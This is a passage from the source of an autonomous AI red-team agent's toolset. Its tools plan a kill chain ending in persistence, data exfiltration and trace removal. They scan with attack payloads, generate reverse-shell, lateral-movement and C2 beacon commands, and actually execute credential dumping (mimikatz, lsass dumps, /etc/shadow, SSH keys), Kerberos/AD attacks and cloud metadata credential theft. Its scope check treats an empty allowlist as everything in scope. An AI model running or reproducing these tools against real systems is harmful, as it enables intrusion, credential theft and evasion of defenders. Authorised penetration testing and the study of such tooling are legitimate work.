						{ phase: "services", cmd: "sc query" },
						{ phase: "scheduled", cmd: "schtasks /query /fo LIST /v" },
						{ phase: "creds", cmd: "cmdkey /list" },
						{
							phase: "defenses",
							cmd: "sc query windefend && netsh advfirewall show allprofiles",
						},
					);
				} else {
					commands.push(
						{ phase: "identity", cmd: "id && whoami && hostname" },
						{ phase: "network", cmd: "ip a && ss -tulpn" },
						{ phase: "users", cmd: "cat /etc/passwd && w" },
						{ phase: "processes", cmd: "ps aux" },
						{ phase: "services", cmd: "systemctl list-units --type=service" },
						{ phase: "scheduled", cmd: "crontab -l && ls /etc/cron.d/" },
						{
							phase: "creds",
							cmd: "find / -name '*.conf' -o -name '*.env' 2>/dev/null | head -20",
						},
						{ phase: "defenses", cmd: "cat /etc/os-release && uname -a" },
						{ phase: "sudo", cmd: "sudo -l" },
						{ phase: "suid", cmd: "find / -perm -4000 -type f 2>/dev/null" },
					);
				}
				return { commands };
			},
		}) as AgentTool,
	);

	const KillChainSchema = z.object({
		target: z.string().min(1),
		objective: z.string().optional(),
	});
	tools.push(
		createTool<
			{ target: string; objective?: string },
			{ chain: string[]; memoryNamespace: string }
		>({
			name: "rt_ref_kill_chain",
			description:
				"Generate an autonomous kill chain plan for a target. Returns ordered steps the agent should execute.",
			inputSchema: zodToJsonSchema(KillChainSchema),
			execute: async (input) => {
				const v = validateWithZod(KillChainSchema, input);
				const chain = [
					"1. rt_stealth_config — set up proxies/UA/jitter",
					"2. rt_recon_subdomains — enumerate subdomains",
					"3. rt_recon_tech — fingerprint tech stack",
					"4. rt_recon_dirs — discover hidden paths",
					"5. rt_recon_ports — scan open ports",
					"6. rt_vuln_scan — detect vulns on discovered endpoints",
					"7. rt_waf_bypass — generate bypass variants if WAF detected",
					"8. rt_auto_exploit — attempt exploitation of confirmed vulns",
					"9. rt_oob_start + rt_oob_poll — for blind vulns (SSRF/XXE/RCE)",
					"10. rt_payload_gen — generate payload for confirmed RCE",
					"11. rt_post_exploit_enum — enumerate compromised host",
					"12. rt_cred_spray — if login forms found",
					"13. rt_persist — establish persistence (if authorized)",
					"14. rt_exfil_encode — encode stolen data",
					"15. rt_finding_log — log all findings",
					"16. rt_report_gen — generate final report",
					"17. rt_cleanup — remove traces",
					"18. memory_store — save target profile, findings, lessons learned",
				];
				return { chain, memoryNamespace: `rt:${v.target}` };
			},
		}) as AgentTool,
	);

	// --- Operational discipline (zero-error invasion) ---

	const ScopeSetSchema = z.object({
		targets: z.array(z.string().min(1)).min(1),
	});
	tools.push(
		createTool<{ targets: string[] }, { scope: string[] }>({
			name: "rt_scope_set",
			description:
				"Set the in-scope target allowlist. All subsequent actions should be checked against it.",
			inputSchema: zodToJsonSchema(ScopeSetSchema),
			execute: async (input) => {
				const v = validateWithZod(ScopeSetSchema, input);
				for (const t of v.targets) scopeAllowlist.add(t.toLowerCase());
				return { scope: [...scopeAllowlist] };
			},
		}) as AgentTool,
	);

	const ScopeCheckSchema = z.object({ target: z.string().min(1) });
	tools.push(
		createTool<{ target: string }, { inScope: boolean; scope: string[] }>({
			name: "rt_scope_check",
			description: "Check whether a target is in the allowlist before acting.",
			inputSchema: zodToJsonSchema(ScopeCheckSchema),
			execute: async (input) => {
				const v = validateWithZod(ScopeCheckSchema, input);
				const t = v.target.toLowerCase();
				const inScope =
					scopeAllowlist.size === 0 ||
					scopeAllowlist.has(t) ||
					[...scopeAllowlist].some((s) => t.endsWith(s) || s.endsWith(t));
				return { inScope, scope: [...scopeAllowlist] };
			},
		}) as AgentTool,
	);

	const DryRunSchema = z.object({ enabled: z.boolean() });
	tools.push(
		createTool<{ enabled: boolean }, { dryRun: boolean }>({
			name: "rt_dry_run",
			description:
				"Toggle dry-run mode. When enabled, tools report intended actions without executing side effects.",
			inputSchema: zodToJsonSchema(DryRunSchema),
			execute: async (input) => {
				const v = validateWithZod(DryRunSchema, input);
				dryRunMode = v.enabled;
				return { dryRun: dryRunMode };
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<Record<string, never>, { killed: boolean }>({
			name: "rt_kill_switch",
			description:
				"Emergency kill switch: mark all operations aborted. Agent should stop further actions.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				killed = true;
				return { killed };
			},
		}) as AgentTool,
	);

	// --- WAF / CDN fingerprint ---
	const WafFpSchema = z.object({ url: z.string().min(1) });
	tools.push(
		createTool<
			{ url: string },
			{ waf?: string; cdn?: string; hints: string[] }
		>({
			name: "rt_ref_waf_fingerprint",
			description:
				"Fingerprint WAF/CDN from response headers and body markers.",
			inputSchema: zodToJsonSchema(WafFpSchema),
			execute: async (input) => {
				const v = validateWithZod(WafFpSchema, input);
				const { headers } = await stealth.preRequest();
				const res = await fetch(v.url, {
					headers: stealth.buildHeaders(headers),
				});
				const body = await res.text();
				const h: Record<string, string> = {};
				res.headers.forEach((val, key) => {
					h[key.toLowerCase()] = val;
				});
				const hints: string[] = [];
				let waf: string | undefined;
				let cdn: string | undefined;
				const checks: [RegExp, string][] = [
					[/cloudflare/i, "Cloudflare"],
					[/akamai/i, "Akamai"],
					[/incapsula|imperva/i, "Imperva/Incapsula"],
					[/sucuri/i, "Sucuri"],
					[/modsecurity/i, "ModSecurity"],
					[/awselb|awsalb/i, "AWS ALB/ELB"],
					[/f5|bigip/i, "F5 BIG-IP"],
					[/barracuda/i, "Barracuda"],
				];
				const combined = `${JSON.stringify(h)} ${body.slice(0, 2000)}`;
				for (const [re, name] of checks) {
					if (re.test(combined)) {
						hints.push(name);
						if (
							!waf &&
							/modsec|imperva|incapsula|sucuri|barracuda|f5/i.test(name)
						)
							waf = name;
						if (!cdn && /cloudflare|akamai|aws/i.test(name)) cdn = name;
					}
				}
				if (h["cf-ray"]) cdn = cdn ?? "Cloudflare";
				if (h.server?.toLowerCase().includes("cloudflare")) cdn = "Cloudflare";
				return { waf, cdn, hints };
			},
		}) as AgentTool,
	);

	// --- Surface discovery ---
	const ParamDiscoverySchema = z.object({
		url: z.string().min(1),
		wordlist: z.array(z.string()).optional(),
	});
	tools.push(
		createTool<
			{ url: string; wordlist?: string[] },
			{ params: string[]; reflected: string[] }
		>({
			name: "rt_ref_discover_params",
			description:
				"Discover GET parameters by trying a wordlist and detecting reflection/status changes.",
			inputSchema: zodToJsonSchema(ParamDiscoverySchema),
			execute: async (input) => {
				const v = validateWithZod(ParamDiscoverySchema, input);
				const wl = v.wordlist ?? [
					"q",
					"id",
					"search",
					"query",
					"page",
					"file",
					"path",
					"url",
					"redirect",
					"next",
					"cmd",
					"lang",
					"category",
					"user",
					"token",
				];
				const params: string[] = [];
				const reflected: string[] = [];
				const base = new URL(v.url);
				const baseline = await (async () => {
					const { headers } = await stealth.preRequest();
					const r = await fetch(base.toString(), {
						headers: stealth.buildHeaders(headers),
					});
					return r.status;
				})();
				for (const p of wl) {
					try {
						const { headers } = await stealth.preRequest();
						const u = new URL(base.toString());
						u.searchParams.set(p, "zyonprobe123");
						const r = await fetch(u.toString(), {
							headers: stealth.buildHeaders(headers),
						});
						const body = await r.text();
						if (r.status !== baseline || body.includes("zyonprobe123")) {
							params.push(p);
							if (body.includes("zyonprobe123")) reflected.push(p);
						}
					} catch {
						// ignore
					}
				}
				return { params, reflected };
			},
		}) as AgentTool,
	);

	const ApiDiscoverySchema = z.object({ baseUrl: z.string().min(1) });
	tools.push(
		createTool<{ baseUrl: string }, { endpoints: string[] }>({
			name: "rt_ref_discover_api",
			description: "Discover common API endpoints and OpenAPI/Swagger specs.",
			inputSchema: zodToJsonSchema(ApiDiscoverySchema),
			execute: async (input) => {
				const v = validateWithZod(ApiDiscoverySchema, input);
				const base = v.baseUrl.replace(/\/$/, "");
				const candidates = [
					"/api",
					"/api/v1",
					"/api/v2",
					"/swagger.json",
					"/openapi.json",
					"/docs",
					"/graphql",
					"/health",
					"/status",
					"/metrics",
					"/v1",
					"/v2",
				];
				const endpoints: string[] = [];
				for (const c of candidates) {
					try {
						const { headers } = await stealth.preRequest();
						const r = await fetch(`${base}${c}`, {
							headers: stealth.buildHeaders(headers),
							redirect: "manual",
						});
						if (r.status < 404) endpoints.push(c);
					} catch {
						// ignore
					}
				}
				return { endpoints };
			},
		}) as AgentTool,
	);

	const GraphqlProbeSchema = z.object({ url: z.string().min(1) });
	tools.push(
		createTool<
			{ url: string },
			{ introspection: boolean; depthVulnerable: boolean; types: string[] }
		>({
			name: "rt_ref_graphql_probe",
			description:
				"Probe a GraphQL endpoint: introspection, depth limit, batching.",
			inputSchema: zodToJsonSchema(GraphqlProbeSchema),
			execute: async (input) => {
				const v = validateWithZod(GraphqlProbeSchema, input);
				const { headers } = await stealth.preRequest();
				const h = {
					...stealth.buildHeaders(headers),
					"Content-Type": "application/json",
				};
				// introspection
				let introspection = false;
				const types: string[] = [];
				try {
					const r = await fetch(v.url, {
						method: "POST",
						headers: h,
						body: JSON.stringify({ query: "{ __schema { types { name } } }" }),
					});
					const j = (await r.json()) as {
						data?: { __schema?: { types?: { name: string }[] } };
					};
					if (j?.data?.__schema?.types) {
						introspection = true;
						for (const t of j.data.__schema.types)
							if (t?.name) types.push(t.name);
					}
				} catch {
					// ignore
				}
				// depth probe
				let depthVulnerable = false;
				try {
					const deep =
						"{ a { b { c { d { e { f { g { h { i { j } } } } } } } } } }";
					const r = await fetch(v.url, {
						method: "POST",
						headers: h,
						body: JSON.stringify({ query: deep }),
					});
					const body = await r.text();
					if (r.status === 200 && !/depth|complexity|too deep/i.test(body))
						depthVulnerable = true;
				} catch {
					// ignore
				}
				return { introspection, depthVulnerable, types };
			},
		}) as AgentTool,
	);

	// --- Template vuln scan (multi-check) ---
	const VulnTplSchema = z.object({
		url: z.string().min(1),
		param: z.string().optional(),
	});
	tools.push(
		createTool<
			{ url: string; param?: string },
			{
				findings: {
					type: string;
					payload: string;
					evidence: string;
					verified: boolean;
				}[];
			}
		>({
			name: "rt_vuln_templates",
			description:
				"Run a template-style vuln scan: XSS, SQLi, LFI, SSRF, open redirect, with evidence verification.",
			inputSchema: zodToJsonSchema(VulnTplSchema),
			execute: async (input) => {
				const v = validateWithZod(VulnTplSchema, input);
				const param = v.param ?? "q";
				const findings: {
					type: string;
					payload: string;
					evidence: string;
					verified: boolean;
				}[] = [];
				const base = new URL(v.url);
				const run = async (
					payload: string,
					type: string,
					verify: (body: string, status: number) => boolean,
				) => {
					try {
						const { headers } = await stealth.preRequest();
						const u = new URL(base.toString());
						u.searchParams.set(param, payload);
						const r = await fetch(u.toString(), {
							headers: stealth.buildHeaders(headers),
						});
						const body = await r.text();
						if (verify(body, r.status)) {
							findings.push({
								type,
								payload,
								evidence: body.slice(0, 300),
								verified: true,
							});
						}
					} catch {
						// ignore
					}
				};
				await run("<script>alert(1)</script>", "XSS", (b) =>
					b.includes("<script>alert(1)</script>"),
				);
				await run("' OR '1'='1", "SQLi", (b) =>
					/sql|syntax|mysql|postgres|ora-|warning/i.test(b),
				);
				await run("../../../etc/passwd", "LFI", (b) => /root:.*:0:0:/i.test(b));
				await run("http://169.254.169.254/latest/meta-data/", "SSRF", (b) =>
					/ami-id|instance-id|meta-data/i.test(b),
				);
				await run(
					"//evil.example",
					"OpenRedirect",
					(_b, s) => s >= 300 && s < 400,
				);
				return { findings };
			},
		}) as AgentTool,
	);

	// --- CVE lookup (NVD) ---
	const CveLookupSchema = z.object({
		keyword: z.string().min(1),
		version: z.string().optional(),
	});
	tools.push(
		createTool<
			{ keyword: string; version?: string },
			{ cves: { id: string; severity?: string; description: string }[] }
		>({
			name: "rt_cve_lookup",
			description:
				"Look up CVEs from NVD by keyword/version for a detected technology.",
			inputSchema: zodToJsonSchema(CveLookupSchema),
			execute: async (input) => {
				const v = validateWithZod(CveLookupSchema, input);
				const q = encodeURIComponent(
					v.version ? `${v.keyword} ${v.version}` : v.keyword,
				);
				const cves: { id: string; severity?: string; description: string }[] =
					[];
				try {
					const r = await fetch(
						`https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=${q}&resultsPerPage=10`,
					);
					if (r.ok) {
						const j = (await r.json()) as {
							vulnerabilities?: {
								cve: {
									id: string;
									descriptions?: { value: string }[];
									metrics?: {
										cvssMetricV31?: { cvssData?: { baseSeverity?: string } }[];
									};
								};
							}[];
						};
						for (const vuln of j.vulnerabilities ?? []) {
							const cve = vuln.cve;
							cves.push({
								id: cve.id,
								severity:
									cve.metrics?.cvssMetricV31?.[0]?.cvssData?.baseSeverity,
								description: cve.descriptions?.[0]?.value ?? "",
							});
						}
					}
				} catch {
					// ignore
				}
				return { cves };
			},
		}) as AgentTool,
	);

	// --- Exploit verification ---
	const ExploitVerifySchema = z.object({
		url: z.string().min(1),
		marker: z.string().min(1),
	});
	tools.push(
		createTool<
			{ url: string; marker: string },
			{ verified: boolean; evidence: string; hash: string }
		>({
			name: "rt_ref_exploit_verify",
			description:
				"Verify an exploitation by checking for a marker in the response; return evidence + hash.",
			inputSchema: zodToJsonSchema(ExploitVerifySchema),
			execute: async (input) => {
				const v = validateWithZod(ExploitVerifySchema, input);
				const { headers } = await stealth.preRequest();
				const r = await fetch(v.url, {
					headers: stealth.buildHeaders(headers),
				});
				const body = await r.text();
				const verified = body.includes(v.marker);
				const { createHash } = await import("node:crypto");
				const hash = createHash("sha256").update(body).digest("hex");
				return { verified, evidence: body.slice(0, 500), hash };
			},
		}) as AgentTool,
	);

	// --- Shell handler ---
	const ShellHandlerSchema = z.object({
		host: z.string().min(1),
		port: z.number().int().positive(),
	});
	tools.push(
		createTool<
			{ host: string; port: number },
			{ listeners: string[]; upgrades: string[] }
		>({
			name: "rt_ref_shell_handler",
			description:
				"Generate reverse shell listener commands and TTY upgrade one-liners.",
			inputSchema: zodToJsonSchema(ShellHandlerSchema),
			execute: async (input) => {
				const v = validateWithZod(ShellHandlerSchema, input);
				const listeners = [
					`nc -lvnp ${v.port}`,
					`rlwrap nc -lvnp ${v.port}`,
					`socat -d -d TCP-LISTEN:${v.port},reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane`,
				];
				const upgrades = [
					"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
					"script -qc /bin/bash /dev/null",
					"stty raw -echo; fg",
					"export TERM=xterm",
				];
				return { listeners, upgrades };
			},
		}) as AgentTool,
	);

	// --- Privesc auto ---
	const PrivescSchema = z.object({
		platform: z.enum(["linux", "windows"]).optional(),
	});
	tools.push(
		createTool<
			{ platform?: string },
			{ vectors: { name: string; commands: string[] }[] }
		>({
			name: "rt_ref_privesc_auto",
			description:
				"Generate privilege escalation enumeration/exploitation commands per platform.",
			inputSchema: zodToJsonSchema(PrivescSchema),
			execute: async (input) => {
				const v = validateWithZod(PrivescSchema, input);
				const isWin = v.platform === "windows";
				if (isWin) {
					return {
						vectors: [
							{
								name: "token_impersonation",
								commands: [
									"whoami /priv",
									"printspoofer.exe -i -c cmd",
									"godpotato.exe -cmd cmd",
								],
							},
							{
								name: "unquoted_service",
								commands: [
									'wmic service get name,pathname | findstr /i /v "C:\\Windows\\"',
									"sc qc <svc>",
								],
							},
							{
								name: "always_install_elevated",
								commands: [
									"reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
									"reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
								],
							},
							{
								name: "scheduled_task",
								commands: [
									'schtasks /query /fo LIST /v | findstr /i "Task To Run"',
									"accesschk.exe -uwcqv *",
								],
							},
						],
					};
				}
				return {
					vectors: [
						{ name: "sudo", commands: ["sudo -l", "sudo -u#-1 /bin/bash"] },
						{
							name: "suid",
							commands: [
								"find / -perm -4000 -type f 2>/dev/null",
								"ls -la /usr/bin/*",
							],
						},
						{ name: "capabilities", commands: ["getcap -r / 2>/dev/null"] },
						{
							name: "cron_writable",
							commands: [
								"ls -la /etc/cron* /var/spool/cron",
								"cat /etc/crontab",
							],
						},
						{ name: "kernel", commands: ["uname -a", "cat /etc/os-release"] },
						{
							name: "path_hijack",
							commands: ["echo $PATH", "find / -writable -type d 2>/dev/null"],
						},
					],
				};
			},
		}) as AgentTool,
	);

	// --- Lateral movement ---
	const LateralSchema = z.object({
		technique: z
			.enum(["psexec", "wmiexec", "smbexec", "winrm", "ssh", "dcom"])
			.optional(),
		host: z.string().min(1),
		user: z.string().optional(),
		password: z.string().optional(),
		hash: z.string().optional(),
	});
	tools.push(
		createTool<
			{
				technique?: string;
				host: string;
				user?: string;
				password?: string;
				hash?: string;
			},
			{ command: string }
		>({
			name: "rt_lateral",
			description: "Generate lateral movement command for a chosen technique.",
			inputSchema: zodToJsonSchema(LateralSchema),
			execute: async (input) => {
				const v = validateWithZod(LateralSchema, input);
				const t = v.technique ?? "wmiexec";
				const auth = v.hash
					? `-hashes :${v.hash}`
					: v.password
						? `-password '${v.password}'`
						: "";
				const u = v.user ? `${v.user}@${v.host}` : v.host;
				let cmd = "";
				switch (t) {
					case "psexec":
						cmd = `impacket-psexec ${auth} ${u} cmd.exe`;
						break;
					case "wmiexec":
						cmd = `impacket-wmiexec ${auth} ${u}`;
						break;
					case "smbexec":
						cmd = `impacket-smbexec ${auth} ${u}`;
						break;
					case "winrm":
						cmd = `evil-winrm -i ${v.host} -u ${v.user ?? "administrator"} ${v.password ? `-p '${v.password}'` : v.hash ? `-H ${v.hash}` : ""}`;
						break;
					case "ssh":
						cmd = `ssh ${v.user ?? "root"}@${v.host}`;
						break;
					case "dcom":
						cmd = `impacket-dcomexec ${auth} ${u} cmd.exe`;
						break;
				}
				return { command: cmd };
			},
		}) as AgentTool,
	);

	// --- Credential dump ---
	const CredDumpSchema = z.object({
		platform: z.enum(["linux", "windows"]).optional(),
		target: z.string().optional(),
	});
	tools.push(
		createTool<
			{ platform?: string; target?: string },
			{
				commands: { tool: string; cmd: string; stdout: string; code: number }[];
			}
		>({
			name: "rt_cred_dump",
			description: "Execute credential dumping commands per platform.",
			inputSchema: zodToJsonSchema(CredDumpSchema),
			execute: async (input) => {
				const v = validateWithZod(CredDumpSchema, input);
				const isWin = v.platform === "windows";
				const cmdList = isWin
					? [
							{ tool: "mimikatz", cmd: "sekurlsa::logonpasswords" },
							{ tool: "mimikatz", cmd: "lsadump::sam" },
							{
								tool: "comsvcs",
								cmd: "rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump <lsass_pid> lsass.dmp full",
							},
						]
					: [
							{ tool: "shadow", cmd: "cat /etc/shadow" },
							{
								tool: "ssh_keys",
								cmd: "find / -name id_rsa -o -name id_ed25519 2>/dev/null",
							},
							{
								tool: "history",
								cmd: "cat ~/.bash_history ~/.zsh_history 2>/dev/null",
							},
						];
				if (killed)
					return {
						commands: cmdList.map((c) => ({
							...c,
							stdout: "killed",
							code: -1,
						})),
					};
				if (dryRunMode)
					return {
						commands: cmdList.map((c) => ({
							...c,
							stdout: "[dry-run]",
							code: 0,
						})),
					};
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				const run = promisify(exec);
				const results: {
					tool: string;
					cmd: string;
					stdout: string;
					code: number;
				}[] = [];
				for (const c of cmdList) {
					try {
						const { stdout } = await run(c.cmd, {
							timeout: 60000,
							maxBuffer: 10 * 1024 * 1024,
						});
						results.push({
							tool: c.tool,
							cmd: c.cmd,
							stdout: stdout.slice(0, 100000),
							code: 0,
						});
					} catch (e: unknown) {
						const err = e as { stdout?: string; code?: number };
						results.push({
							tool: c.tool,
							cmd: c.cmd,
							stdout: (err.stdout ?? "").slice(0, 100000),
							code: err.code ?? 1,
						});
					}
				}
				return { commands: results };
			},
		}) as AgentTool,
	);

	// --- Kerberos / AD ---
	const KerberosSchema = z.object({
		technique: z
			.enum(["kerberoast", "asrep", "dcsync", "golden", "delegation", "shadow"])
			.optional(),
		domain: z.string().optional(),
		user: z.string().optional(),
	});
	tools.push(
		createTool<
			{ technique?: string; domain?: string; user?: string },
			{ commands: { cmd: string; stdout: string; code: number }[] }
		>({
			name: "rt_kerberos",
			description: "Execute Kerberos/AD attack commands.",
			inputSchema: zodToJsonSchema(KerberosSchema),
			execute: async (input) => {
				const v = validateWithZod(KerberosSchema, input);
				const t = v.technique ?? "kerberoast";
				const d = v.domain ?? "DOMAIN.LOCAL";
				const u = v.user ?? "user";
				const cmds: string[] = [];
				switch (t) {
					case "kerberoast":
						cmds.push(
							`impacket-GetUserSPNs ${d}/${u} -request -outputfile kerberoast.txt`,
						);
						break;
					case "asrep":
						cmds.push(
							`impacket-GetNPUsers ${d}/ -usersfile users.txt -format hashcat -outputfile asrep.txt`,
						);
						break;
					case "dcsync":
						cmds.push(`impacket-secretsdump ${d}/${u}@dc.${d} -just-dc`);
						break;
					case "golden":
						cmds.push(
							`impacket-ticketer -nthash <krbtgt_hash> -domain-sid <sid> -domain ${d} administrator`,
						);
						break;
					case "delegation":
						cmds.push(`impacket-findDelegation ${d}/${u}`);
						cmds.push(
							`impacket-getST -spn cifs/target.${d} -impersonate administrator ${d}/${u}`,
						);
						break;
					case "shadow":
						cmds.push(
							`python3 pywhisker.py -d ${d} -u ${u} -p <pass> --target dc$ --action add`,
						);
						break;
					default:
						cmds.push(`impacket-GetUserSPNs ${d}/${u} -request`);
						break;
				}
				if (killed)
					return {
						commands: cmds.map((c) => ({ cmd: c, stdout: "killed", code: -1 })),
					};
				if (dryRunMode)
					return {
						commands: cmds.map((c) => ({
							cmd: c,
							stdout: "[dry-run]",
							code: 0,
						})),
					};
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				const run = promisify(exec);
				const results: { cmd: string; stdout: string; code: number }[] = [];
				for (const cmd of cmds) {
					try {
						const { stdout } = await run(cmd, {
							timeout: 600000,
							maxBuffer: 10 * 1024 * 1024,
						});
						results.push({ cmd, stdout: stdout.slice(0, 100000), code: 0 });
					} catch (e: unknown) {
						const err = e as { stdout?: string; code?: number };
						results.push({
							cmd,
							stdout: (err.stdout ?? "").slice(0, 100000),
							code: err.code ?? 1,
						});
					}
				}
				return { commands: results };
			},
		}) as AgentTool,
	);

	// --- Cloud recon ---
	const CloudReconSchema = z.object({
		provider: z.enum(["aws", "azure", "gcp"]).optional(),
	});
	tools.push(
		createTool<
			{ provider?: string },
			{ checks: { cmd: string; stdout: string; code: number }[] }
		>({
			name: "rt_cloud_recon",
			description: "Execute cloud reconnaissance commands.",
			inputSchema: zodToJsonSchema(CloudReconSchema),
			execute: async (input) => {
				const v = validateWithZod(CloudReconSchema, input);
				const p = v.provider ?? "aws";
				const cmds: string[] = [];
				if (p === "aws") {
					cmds.push(
						"curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/",
					);
					cmds.push("aws s3 ls");
					cmds.push("aws sts get-caller-identity");
				} else if (p === "azure") {
					cmds.push(
						"curl -s -H 'Metadata: true' http://169.254.169.254/metadata/instance?api-version=2021-02-01",
					);
					cmds.push("az storage account list");
				} else {
					cmds.push(
						"curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/",
					);
					cmds.push("gsutil ls");
				}
				if (killed)
					return {
						checks: cmds.map((c) => ({ cmd: c, stdout: "killed", code: -1 })),
					};
				if (dryRunMode)
					return {
						checks: cmds.map((c) => ({ cmd: c, stdout: "[dry-run]", code: 0 })),
					};
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				const run = promisify(exec);
				const results: { cmd: string; stdout: string; code: number }[] = [];
				for (const cmd of cmds) {
					try {
						const { stdout } = await run(cmd, {
							timeout: 120000,
							maxBuffer: 10 * 1024 * 1024,
						});
						results.push({ cmd, stdout: stdout.slice(0, 100000), code: 0 });
					} catch (e: unknown) {
						const err = e as { stdout?: string; code?: number };
						results.push({
							cmd,
							stdout: (err.stdout ?? "").slice(0, 100000),
							code: err.code ?? 1,
						});
					}
				}
				return { checks: results };
			},
		}) as AgentTool,
	);

	// --- Container escape ---
	tools.push(
		createTool<
			Record<string, never>,
			{ checks: { name: string; cmd: string; stdout: string; code: number }[] }
		>({
			name: "rt_container_escape",
			description: "Execute container escape checks.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				const checks = [
					{ name: "docker_sock", cmd: "ls -la /var/run/docker.sock" },
					{ name: "privileged", cmd: "capsh --print" },
					{
						name: "k8s_token",
						cmd: "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
					},
					{ name: "cgroup", cmd: "cat /proc/1/cgroup" },
				];
				if (killed)
					return {
						checks: checks.map((c) => ({ ...c, stdout: "killed", code: -1 })),
					};
				if (dryRunMode)
					return {
						checks: checks.map((c) => ({ ...c, stdout: "[dry-run]", code: 0 })),
					};
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				const run = promisify(exec);
				const results: {
					name: string;
					cmd: string;
					stdout: string;
					code: number;
				}[] = [];
				for (const c of checks) {
					try {
						const { stdout } = await run(c.cmd, {
							timeout: 60000,
							maxBuffer: 10 * 1024 * 1024,
						});
						results.push({
							name: c.name,
							cmd: c.cmd,
							stdout: stdout.slice(0, 100000),
							code: 0,
						});
					} catch (e: unknown) {
						const err = e as { stdout?: string; code?: number };
						results.push({
							name: c.name,
							cmd: c.cmd,
							stdout: (err.stdout ?? "").slice(0, 100000),
							code: err.code ?? 1,
						});
					}
				}
				return { checks: results };
			},
		}) as AgentTool,
	);

	// --- C2 beacon config ---
	const C2Schema = z.object({
		host: z.string().min(1),
		port: z.number().int().positive(),
		protocol: z.enum(["http", "https", "dns", "mtls"]).optional(),
		jitter: z.number().int().nonnegative().optional(),
	});
	tools.push(
		createTool<
			{ host: string; port: number; protocol?: string; jitter?: number },
			{ config: unknown; listener: string }
		>({
			name: "rt_c2_beacon",
			description: "Generate a C2 beacon configuration and listener command.",
			inputSchema: zodToJsonSchema(C2Schema),
			execute: async (input) => {
				const v = validateWithZod(C2Schema, input);
				const proto = v.protocol ?? "https";
				const jitter = v.jitter ?? 30;
				const config = {
					host: v.host,
					port: v.port,
					protocol: proto,
					sleep: 60,
					jitter,
					useragent: "Mozilla/5.0",
				};
				const listener =
					proto === "dns"
						? `python3 dnscat2.rb ${v.host}`
						: `socat -d -d TCP-LISTEN:${v.port},reuseaddr,fork EXEC:/bin/bash`;
				return { config, listener };
			},
		}) as AgentTool,
	);

	// --- Evidence log ---
	const EvidenceSchema = z.object({
		target: z.string().min(1),
		action: z.string().min(1),
		result: z.string().min(1),
		artifact: z.string().optional(),
	});
	tools.push(
		createTool<
			{ target: string; action: string; result: string; artifact?: string },
			{ entry: unknown; hash: string }
		>({
			name: "rt_evidence_log",
			description:
				"Log an evidence entry with timestamp and SHA-256 hash for chain of custody.",
			inputSchema: zodToJsonSchema(EvidenceSchema),
			execute: async (input) => {
				const v = validateWithZod(EvidenceSchema, input);
				const { createHash } = await import("node:crypto");
				const payload = JSON.stringify({ ...v, ts: Date.now() });
				const hash = createHash("sha256").update(payload).digest("hex");
				const entry = { ...v, timestamp: new Date().toISOString(), hash };
				return { entry, hash };
			},
		}) as AgentTool,
	);

	// --- Retest ---
	const RetestSchema = z.object({
		url: z.string().min(1),
		marker: z.string().min(1),
	});
	tools.push(
		createTool<
			{ url: string; marker: string },
			{ stillVulnerable: boolean; evidence: string }
		>({
			name: "rt_ref_retest",
			description:
				"Retest a finding to confirm it is still exploitable (regression check).",
			inputSchema: zodToJsonSchema(RetestSchema),
			execute: async (input) => {
				const v = validateWithZod(RetestSchema, input);
				const { headers } = await stealth.preRequest();
				const r = await fetch(v.url, {
					headers: stealth.buildHeaders(headers),
				});
				const body = await r.text();
				return {
					stillVulnerable: body.includes(v.marker),
					evidence: body.slice(0, 300),
				};
			},
		}) as AgentTool,
	);

	// --- Target profile (memory helper) ---
	const TargetProfileSchema = z.object({
		target: z.string().min(1),
		tech: z.array(z.string()).optional(),
		vulns: z.array(z.string()).optional(),
		creds: z.array(z.string()).optional(),
	});
	tools.push(
		createTool<
			{ target: string; tech?: string[]; vulns?: string[]; creds?: string[] },
			{ profile: unknown }
		>({
			name: "rt_target_profile",
			description:
				"Build a structured target profile for memory_store (kind=target).",
			inputSchema: zodToJsonSchema(TargetProfileSchema),
			execute: async (input) => {
				const v = validateWithZod(TargetProfileSchema, input);
				const profile = {
					target: v.target,
					tech: v.tech ?? [],
					vulns: v.vulns ?? [],
					creds: v.creds ?? [],
					updatedAt: new Date().toISOString(),
				};
				const { appendFileSync } = await import("node:fs");
				appendFileSync("target-profiles.jsonl", `${JSON.stringify(profile)}\n`);
				return { profile, persisted: true };
			},
		}) as AgentTool,
	);

	// --- Execution layer (real run + verification + enforcement) ---

	const auditLog: {
		ts: number;
		target?: string;
		command: string;
		hash: string;
		code: number;
	}[] = [];

	const ExecSchema = z.object({
		command: z.string().min(1),
		target: z.string().optional(),
		timeoutMs: z.number().int().positive().optional(),
	});
	tools.push(
		createTool<
			{ command: string; target?: string; timeoutMs?: number },
			{
				stdout: string;
				stderr: string;
				code: number;
				hash: string;
				dryRun: boolean;
				aborted: boolean;
				outOfScope: boolean;
			}
		>({
			name: "rt_exec",
			description:
				"Execute a shell command with scope/dry-run/kill-switch enforcement. Captures output and hashes it for audit.",
			inputSchema: zodToJsonSchema(ExecSchema),
			execute: async (input) => {
				const v = validateWithZod(ExecSchema, input);
				if (killed)
					return {
						stdout: "",
						stderr: "killed",
						code: -1,
						hash: "",
						dryRun: false,
						aborted: true,
						outOfScope: false,
					};
				if (v.target) {
					const t = v.target.toLowerCase();
					const inScope =
						scopeAllowlist.size === 0 ||
						scopeAllowlist.has(t) ||
						[...scopeAllowlist].some((s) => t.endsWith(s) || s.endsWith(t));
					if (!inScope)
						return {
							stdout: "",
							stderr: "out of scope",
							code: -1,
							hash: "",
							dryRun: false,
							aborted: false,
							outOfScope: true,
						};
				}
				if (dryRunMode)
					return {
						stdout: "",
						stderr: "",
						code: 0,
